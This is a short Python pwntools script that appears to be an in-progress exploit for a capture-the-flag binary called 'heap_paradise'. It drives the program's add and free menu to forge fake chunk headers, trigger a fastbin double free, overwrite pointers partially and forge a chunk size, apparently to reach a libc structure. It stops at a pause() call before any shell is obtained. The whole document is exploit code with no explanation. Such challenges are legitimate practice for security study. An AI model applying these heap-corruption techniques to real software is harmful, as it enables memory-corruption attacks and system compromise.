from pwn import *

io = process('heap_paradise')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, data):
    print(io.recvuntil('You Choice:'))
    io.sendline('1')
    print(io.recvuntil('Size :'))
    io.sendline(str(size))
    print(io.recvuntil('Data :'))
    io.send(data)

def free(index):
    print(io.recvuntil('You Choice:'))
    io.sendline('2')
    print(io.recvuntil('Index :'))
    io.sendline(str(index))


payload = p64(0)+p64(0x21)
add(0x18, payload)
add(0x18, payload)
add(0x78, b'OK')
free(2)
add(0x28, b'OK')
add(0x28, b'OK')
free(0)
free(1)
free(0)
add(0x18, b'\x30')
add(0x18, b'OK')
add(0x18, b'OK')
add(0x18, p64(0)+p64(0xb1))
free(2)
add(0x68, b'\xdd\x55')
pause()
add(0x18, b'OK')
